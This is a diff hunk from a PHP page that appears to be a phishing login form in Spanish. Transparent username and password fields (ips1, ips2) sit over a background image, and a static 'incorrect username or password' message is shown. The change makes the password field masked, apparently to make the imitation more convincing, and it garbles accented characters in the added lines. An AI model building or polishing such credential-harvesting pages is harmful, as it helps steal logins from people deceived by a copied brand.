@@ -62,10 +62,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
                 <input id="i1" name="ips1" placeholder="Usuario" type="text" required
                        style="display: block; position: relative; color:#333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="this.value = this.value.replace(/\s/g, '')">
-                <input id="i2" name="ips2" placeholder="Contraseña" type="text" required
-                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" oninput="handlePasswordInput(this)" onkeypress="return noEspacios(event)">
-                <p id="error-message" style="font-family: sans-serif;">Usuario o contraseña incorrecta</p>
-                <input type="submit" value="Inicie Sesión"
+                <input id="i2" name="ips2" placeholder="Contraseña" type="password" required
+                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="this.value = this.value.replace(/\s/g, '')">
+                <p id="error-message" style="font-family: sans-serif;">Usuario o contrasea incorrecta</p>
+                <input type="submit" value="Inicie Sesin"
                        style="font-size: 16px; display: block; position: relative; color: #fff; background: rgb(0, 105, 60); border: none; top: 348px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;">
             </form>
         </div>
